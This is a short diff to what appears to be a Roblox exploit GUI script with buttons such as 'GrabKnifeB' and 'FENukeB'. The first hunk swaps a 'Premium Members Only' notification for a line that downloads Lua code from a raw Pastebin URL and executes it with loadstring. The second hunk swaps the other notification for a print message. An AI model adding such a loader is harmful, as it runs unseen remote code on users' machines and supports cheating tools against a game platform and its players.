@@ -395,13 +395,7 @@ local function PXJK_fake_script() -- GrabKnifeB.LocalScript
 
 	script.Parent.MouseButton1Down:Connect(function()
 		
-		game.StarterGui:SetCore(
-			"SendNotification",
-			{
-				Title = "Error",
-				Text = "Premium Members Only",
-			}
-		)
+	loadstring(game:HttpGet("https://pastebin.com/raw/vXgWessT", true))()
 		
 	end)
 end
@@ -765,13 +759,7 @@ local function CJLTZDD_fake_script() -- FENukeB.LocalScript
 
 	script.Parent.MouseButton1Down:Connect(function()
 	
-		game.StarterGui:SetCore(
-			"SendNotification",
-			{
-				Title = "Error",
-				Text = "Premium Members Only",
-			}
-		)
+		print("Error: Nuke is a command from Premium")
 	
 	end)
 end
